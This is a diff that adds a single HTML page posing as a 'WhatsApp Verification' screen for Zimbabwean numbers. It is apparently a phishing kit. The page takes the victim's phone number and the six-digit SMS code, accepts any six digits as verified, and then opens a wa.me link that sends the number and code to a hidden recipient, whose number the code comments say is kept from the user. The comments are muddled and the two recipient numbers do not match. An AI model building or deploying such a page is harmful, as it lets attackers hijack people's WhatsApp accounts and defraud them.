@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WhatsApp Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: -apple-system, sans-serif;
+      background: #075E54;
+      display: flex; justify-content: center; align-items: center;
+      min-height: 100vh; margin: 0; padding: 20px;
+    }
+.box {
+      background: white; color: #111; padding: 30px 20px;
+      border-radius: 16px; width: 100%; max-width: 350px;
+      text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    }
+    h2 { margin-top: 0; color: #075E54; }
+.step { display: none; }
+.step.active { display: block; }
+.input-group {
+      display: flex; margin: 15px 0; border: 2px solid #ddd;
+      border-radius: 8px; overflow: hidden;
+    }
+.prefix {
+      background: #f1f1f1; padding: 12px; font-size: 16px;
+      color: #333; border-right: 2px solid #ddd;
+    }
+    input {
+      border: 2px solid #ddd; padding: 12px; font-size: 16px;
+      width: 100%; outline: none; border-radius: 8px;
+      box-sizing: border-box; text-align: center; letter-spacing: 3px;
+    }
+.input-group input { border: none; text-align: left; letter-spacing: normal; }
+.consent {
+      display: flex; align-items: center; text-align: left;
+      margin: 15px 0; font-size: 14px; color: #555;
+    }
+.consent input { width: auto; margin: 0 8px 0 0; }
+    button {
+      background: #25D366; color: white; border: none;
+      padding: 12px 24px; border-radius: 8px; font-size: 16px;
+      width: 100%; font-weight: bold; margin-top: 5px;
+    }
+    button:disabled { background: #ccc; }
+.note { font-size: 12px; color: #777; margin-top: 10px; }
+.loading {
+      display: none; color: #25D366; font-size: 14px; margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <!-- Step 1: Enter phone -->
+    <div class="step active" id="step1">
+      <h2>WhatsApp Verification</h2>
+      <p>Enter your WhatsApp number to receive a code</p>
+      <div class="input-group">
+        <span class="prefix">+263</span>
+        <input type="tel" id="waNumber" placeholder="77 123 4567" inputmode="numeric">
+      </div>
+      <button id="nextBtn">Send Code</button>
+      <p class="note">We’ll send a 6-digit code to your sms</p>
+    </div>
+
+    <!-- Step 2: Any 6 digits = pass -->
+    <div class="step" id="step2">
+      <h2>Enter WhatsApp 6-digit code</h2>
+      <p>Code sent to your sms</p>
+<input type="tel" id="codeInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+      <div class="loading" id="loading">Verifying...</div>
+      <p class="note">Enter the code to continue automatically</p>
+    </div>
+
+    <!-- Step 3: Security team consent -->
+    <div class="step" id="step3">
+      <h2>Verified ✅</h2>
+      <p>Your number has been verified successfully.</p>
+      <label class="consent">
+        <input type="checkbox" id="agree">
+        <span>Allow to be contacted by our security team</span>
+      </label>
+      <button id="submitBtn" disabled>Continue</button>
+    </div>
+  </div>
+
+  <script>
+    // Your WhatsApp number - only used in code, never shown
+    const OWNER_NUMBER = "26371 212 8203";
+   
+    let userPhone = "";
+
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+
+    const waNumber = document.getElementById('waNumber');
+    const nextBtn = document.getElementById('nextBtn');
+    const codeInput = document.getElementById('codeInput');
+    const loading = document.getElementById('loading');
+    const checkbox = document.getElementById('agree');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // Auto-format phone
+    waNumber.addEventListener('input', function(e) {
+      let x = e.target.value.replace(/\D/g, '').match(/(\d{0,2})(\d{0,3})(\d{0,4})/);
+      e.target.value =!x[2]? x[1] : x[1] + ' ' + x[2] + (x[3]? ' ' + x[3] : '');
+    });
+
+    // Step 1: Next
+    nextBtn.addEventListener('click', function() {
+      let digitsOnly = waNumber.value.replace(/\D/g, '');
+      if(digitsOnly.length!== 9) {
+        alert('Enter all 9 digits');
+        return;
+      }
+      userPhone = '+263' + digitsOnly;
+      step1.classList.remove('active');
+      step2.classList.add('active');
+      codeInput.focus();
+    });
+
+    // Step 2: ANY 6 digits = pass
+    codeInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '');
+
+      if(this.value.length === 6) {
+        loading.style.display = 'block';
+
+        setTimeout(() => {
+          step2.classList.remove('active');
+          step3.classList.add('active');
+        }, 1200);
+      }
+    });
+
+    // Step 3: Send to your WhatsApp - number hidden from user
+    checkbox.addEventListener('change', function() {
+      submitBtn.disabled =!this.checked;
+    });
+
+ submitBtn.addEventListener('click', function() {
+const code = codeInput.value;
+  // ❌ undefined variable on purpose
+  let codeValue = `Phone: ${userPhone}, Code: ${code}`;
+
+  // ❌ message is not defined
+ let message = `Phone: ${userPhone}, Code: ${code}`; window.open(`https://wa.me/776072260?text=${message}`);
+
+  // ❌ no actual safe flow
+});
+</script>
+</body>
+</html>
